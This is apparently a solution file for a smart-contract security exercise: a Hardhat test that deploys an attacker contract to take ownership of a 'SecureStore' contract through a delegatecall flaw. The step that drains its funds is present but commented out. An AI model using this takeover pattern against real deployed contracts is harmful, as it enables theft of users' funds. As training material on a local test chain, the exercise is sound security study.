const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('Delegatecall', function () {
  let deployer, attacker, secureStore, registry;

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, attacker] = await ethers.getSigners();

    const Registry = await ethers.getContractFactory('Registry');
    registry = await Registry.connect(deployer).deploy();

    const SecureStore = await ethers.getContractFactory('SecureStore');
    secureStore = await SecureStore.connect(deployer).deploy(registry.address, 500000);

    // Setup SecureStore
    await network.provider.send("hardhat_setBalance", [
      secureStore.address,
      "0x8AC7230489E80000",
    ]);

  });

  it('Exploit', async () => {
    /** CODE YOUR SOLUTION HERE */

    const AttackerContract = await ethers.getContractFactory('Attacker');
    const attackerContract = await AttackerContract.connect(attacker).deploy();

    // Setup attacker's address
    await network.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x8AC7230489E80000",
    ]);

    // Change the address of the Registry
    await attackerContract.connect(attacker).changeWHAddress(secureStore.address, {value: await secureStore.pricePerDay()});
    
    console.log("first attack called ");
    // Advance the block timestamp by 1 day
    await network.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]);

    // Change the owner to the attacker's address
    await attackerContract.connect(attacker).changeOwner(secureStore.address, {value: await secureStore.pricePerDay()});
    console.log(await secureStore.owner());
    console.log(await attacker.address);

    // Withdrawing the SecureStore's funds
    // const attackerBefore = await ethers.provider.getBalance(attacker.address);
    // console.log("Attacker's balance before ", attackerBefore);
    
    // // Withdraw all the funds from the SecureStore
    // await secureStore.connect(attacker).withdrawAll();
  });

  after(async () => {
    /** SUCCESS CONDITIONS */

    // const balanceSecureStore = await ethers.provider.getBalance(secureStore.address);
    // expect(balanceSecureStore).to.eq(0);

    // console.log("Attacker's balance after exploit: ", await ethers.provider.getBalance(attacker.address));
  });
});